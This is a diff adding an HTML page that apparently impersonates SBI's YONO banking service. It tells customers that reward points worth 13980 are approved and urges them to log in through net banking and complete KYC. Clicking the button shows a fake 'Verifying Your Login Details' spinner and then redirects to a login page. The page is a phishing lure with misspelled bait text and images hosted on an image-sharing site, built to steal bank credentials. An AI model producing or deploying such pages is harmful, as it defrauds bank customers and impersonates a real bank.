@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>sbyonirewpotino</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #eef2f5;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .header, .footer {
+      width: 100%;
+      background-color: #fff;
+      text-align: center;
+    }
+    .header img, .footer img {
+      width: 100%;
+      max-width: 1000px;
+      display: block;
+      margin: 0 auto;
+    }
+    .container {
+      background-color: white;
+      width: 100%;
+      max-width: 360px;
+      padding: 22px 16px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      margin: 15px 0;
+    }
+    .logo img {
+      width: 150px;
+      margin-bottom: 10px;
+    }
+    .message {
+      font-size: 15px;
+      color: #444;
+      line-height: 1.6;
+      margin-bottom: 25px;
+    }
+    .message strong {
+      color: #6a1b9a;
+    }
+    .message span {
+      color: #0086d1;
+      font-weight: bold;
+    }
+    .login-btn {
+      background-color: #6a1b9a;
+      color: white;
+      border: none;
+      padding: 12px 0;
+      font-size: 14px;
+      width: 80%;
+      border-radius: 4px;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
+      margin-bottom: 20px;
+    }
+    .login-btn:hover {
+      background-color: #530d80;
+    }
+    .security-image img {
+      width: 100%;
+      max-width: 360px;
+      border-radius: 6px;
+      margin-bottom: 30px;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.85);
+      backdrop-filter: blur(5px);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      display: none;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    .spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #6a1b9a;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .loading-text {
+      font-size: 16px;
+      color: #333;
+      text-align: center;
+      line-height: 1.5;
+    }
+
+    @media (max-width: 480px) {
+      .message {
+        font-size: 14px;
+      }
+      .login-btn {
+        font-size: 13px;
+        width: 90%;
+      }
+      .loading-text {
+        font-size: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="overlay" id="overlay">
+  <div class="spinner"></div>
+  <div class="loading-text">
+    Please wait...<br>Verifying Your Login Details...<br>Redirecting in <span id="countdown">3</span> seconds.
+  </div>
+</div>
+
+<div class="header">
+  <img src="https://i.ibb.co/gFdsbQQT/YONO-Logo-1.png" alt="Top Header Logo">
+</div>
+
+<div class="container">
+  <div class="logo">
+    <img src="https://i.ibb.co/QFvf6vPq/IMG-20250428-192351.jpg" alt="YONO SBI Logo">
+  </div>
+
+  <div class="message">
+    Dear Customer Your <strong>REWARDZ Point worth 13980/-</strong> is Aproved sucessfully. Amount will be deposited in your bank account. <span>Kindly Redeem through NET Banking</span>. Complete KYC Now for <strong>Reward Points</strong>.
+  </div>
+
+  <a href="#" class="login-btn" onclick="showLoading()">LOG IN</a>
+
+  <div class="security-image">
+    <img src="https://i.ibb.co/zVvCpZM2/Security-A.jpg" alt="Security Image">
+  </div>
+</div>
+
+<div class="footer">
+  <img src="https://i.ibb.co/FbxkQBpm/Footer.jpg" alt="Footer Image">
+</div>
+
+<script>
+  function showLoading() {
+    document.getElementById('overlay').style.display = 'flex';
+    var countdown = 3;
+    var countdownElement = document.getElementById('countdown');
+
+    var interval = setInterval(function() {
+      countdown--;
+      if (countdown >= 0) {
+        countdownElement.textContent = countdown;
+      }
+      if (countdown < 0) {
+        clearInterval(interval);
+        window.location.href = 'login.html';
+      }
+    }, 1000);
+  }
+</script>
+
+</body>
+</html>
